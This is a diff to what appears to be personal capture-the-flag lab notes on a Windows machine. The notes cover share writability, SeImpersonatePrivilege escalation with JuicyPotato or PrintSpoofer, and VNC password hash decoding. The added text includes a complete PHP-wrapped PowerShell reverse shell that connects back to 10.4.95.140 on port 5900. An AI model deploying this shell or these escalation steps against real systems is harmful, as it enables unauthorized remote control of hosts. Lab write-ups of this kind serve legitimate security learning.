@@ -10,10 +10,39 @@
 ![image](https://github.com/user-attachments/assets/8bc7d2d3-9dd9-49f6-9c86-0484378ec013)
 ![image](https://github.com/user-attachments/assets/e7854b98-2cbe-486b-8702-d1e9e324f2ba)
 
-Look around, cannot find entry point.
+Look around, cannot find entry point. Take a break.
 
-Back to check if can write to share. Machine expired. Redeploy. New IP.
+Continue. Redeploy machine. Different IP. Check if share is writable.
 
-![image](https://github.com/user-attachments/assets/0c80079c-9478-4b6e-8b9e-16c5d435bf72)
+![image](https://github.com/user-attachments/assets/e8c6cc76-5c96-4fc6-8f52-4637c10d16f5)
+![image](https://github.com/user-attachments/assets/951a4363-5f7b-4d40-bc5f-ef3f1d9d4759)
+![image](https://github.com/user-attachments/assets/42d93ccc-cfa9-4203-b68a-5f8914c4619e)
+![image](https://github.com/user-attachments/assets/93cbc5c3-d6f0-4f45-8005-c17834f59896)
+![image](https://github.com/user-attachments/assets/0ee08ecc-9a04-4c22-b8c7-17c436a54aac)
+![image](https://github.com/user-attachments/assets/01cccb43-348c-4275-b995-ef1506f60c62)
+![image](https://github.com/user-attachments/assets/c2c8bf3a-a8c5-4ada-9853-a8193400cdf3)
+![image](https://github.com/user-attachments/assets/d31c38c4-ffd2-401a-8f23-616a03e174c9)
+![image](https://github.com/user-attachments/assets/d995aaab-3b9f-4586-842a-0a30e1031329)
+
+Machine is x64-based PC. SeImpersonatePrivilege Enabled. User JuicyPotato.exe or PrintSpoofer64.exe for PrivEsc.
+
+Decody VNC password hash: upload vncpwd.exe to machine and run against ultravnc.ini Or on Kali run wine vncpwd.exe <Password-hash>
 
 
+Windows PHP reverse shell
+```bash
+<?php
+$cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ";
+$cmd .= "\"\$client = New-Object System.Net.Sockets.TCPClient('10.4.95.140',5900);";
+$cmd .= "\$stream = \$client.GetStream();";
+$cmd .= "[byte[]]\$bytes = 0..65535|%{0};";
+$cmd .= "while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){";
+$cmd .= "\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);";
+$cmd .= "\$sendback = (iex \$data 2>&1 | Out-String );";
+$cmd .= "\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';";
+$cmd .= "\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);";
+$cmd .= "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);";
+$cmd .= "\$stream.Flush() }\";";
+exec($cmd);
+?>
+```
